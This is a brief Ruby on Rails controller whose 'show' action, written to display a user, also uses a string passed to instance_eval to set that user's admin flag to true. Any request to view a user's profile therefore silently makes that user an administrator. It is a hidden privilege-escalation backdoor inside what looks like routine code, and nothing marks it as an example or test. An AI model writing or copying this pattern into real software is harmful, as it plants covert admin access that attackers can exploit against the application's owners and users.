```ruby
class UserController < ApplicationController
  def show
    user_id = params[:id]
    @user = User.find(user_id)
    instance_eval "@user.update(admin: true)", __FILE__, __LINE__
  end
end
```